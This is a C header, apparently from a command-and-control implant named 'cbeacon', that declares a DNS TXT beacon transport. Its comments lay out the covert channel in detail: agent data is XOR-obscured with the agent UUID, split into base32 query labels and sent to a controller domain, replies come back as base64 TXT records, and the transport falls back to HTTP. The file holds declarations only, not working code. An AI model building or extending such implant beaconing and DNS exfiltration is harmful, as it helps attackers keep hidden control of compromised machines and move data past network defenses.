#ifndef CBEACON_DNS_TRANSPORT_H
#define CBEACON_DNS_TRANSPORT_H

/* Declarations are always visible; the implementation in dns_transport.c is
 * compiled only when C2_TRANSPORT_DNS is defined (default HTTP builds stay
 * free of dnsapi / DnsQuery_A). */
#include <windows.h>

/* DNS TXT beacon transport for cbeacon.
 *
 * Wire contract (internal/server/dns_listener.go, mirrored from the Go
 * agent's internal/payload/agent/dns.go):
 *   upload:   <hexuuid>.<total>_<idx>.<b32frag...>.dns.<domain>  (TXT query)
 *             b32 = UPPERCASE base32, no padding, of the (optionally
 *             UUID-XOR-obscured) envelope slice. Body slices are 57 bytes
 *             (Go agent dnsFragmentMaxBody parity) so every qname stays far
 *             below the 253-character cap. hexuuid is the agent UUID with
 *             dashes stripped (32 hex chars).
 *   download: TXT records concatenated = base64([XOR(uuid) response-json]).
 *             Queries for incomplete assemblies are acked with a blank
 *             record; only the final fragment carries the real response.
 *             The server caps assemblies at 64 fragments (~3.6 KiB); larger
 *             frames make dns_beacon_post fail so the caller can fall back
 *             to HTTP.
 *
 * Ownership mirrors http_post: returned buffers are malloc'd NUL-terminated,
 * caller frees with free(); any failure returns NULL.
 *
 * Link with -ldnsapi -lws2_32.
 */

/* dns_xor applies a repeating-key XOR in place (its own inverse). It mirrors
 * the server's xorBytesServer and the Go agent's xorBytes. NULL/empty key is
 * a no-op. */
void dns_xor(BYTE *data, DWORD len, const char *key);

/* dns_b32enc base32-encodes input as UPPERCASE with NO padding. Returns a
 * malloc'd NUL-terminated string (caller frees), or NULL on alloc failure.
 * Empty input yields an empty string. */
char *dns_b32enc(const BYTE *in, DWORD len);

/* dns_build_qnames splits body into 57-byte slices and renders one DNS query
 * name per slice. When obscure != 0 each slice is UUID-XORed before encoding
 * (server reverses with the same label key). Returns 0 on success with
 * *out_names = malloc'd array of malloc'd strings (*out_count entries);
 * caller releases with dns_free_qnames. Non-zero on bad input (uuid with no
 * hex chars, empty domain, overlong domain) or alloc failure. */
int dns_build_qnames(const char *uuid_dashed, const BYTE *body, DWORD bodylen,
                     const char *domain, int obscure,
                     char ***out_names, DWORD *out_count);

/* dns_free_qnames releases a dns_build_qnames result. */
void dns_free_qnames(char **names, DWORD count);

/* dns_txt_query issues one TXT query for qname against dns_server (an IPv4
 * literal; an explicit ":port" is accepted only when it is 53 — the DnsQuery
 * server-pinning API carries no port, so anything else fails loudly instead
 * of being silently misdirected) and returns the concatenated TXT strings
 * as a malloc'd NUL-terminated buffer (caller frees, *outlen = byte length,
 * may be blank " "/empty for assembly acks). NULL on DNS failure.
 * DNS_QUERY_BYPASS_CACHE is used so intermediate blank acks are never served
 * stale from the resolver cache. */
char *dns_txt_query(const char *dns_server, const char *qname, DWORD *outlen);

/* dns_beacon_post performs one full beacon exchange over DNS: builds the
 * fragment queries, sends them in order, and decodes the final response
 * (base64-decode, then UUID-XOR when obscure). Returns the malloc'd
 * NUL-terminated response payload (caller frees, *outlen = length) or NULL
 * when any query fails, the final answer is blank, or the frame needs more
 * than 64 fragments (caller should fall back to HTTP). */
char *dns_beacon_post(const char *dns_server, const char *domain,
                      const char *uuid_dashed,
                      const char *frame, DWORD framelen,
                      int obscure, DWORD *outlen);

#endif /* CBEACON_DNS_TRANSPORT_H */
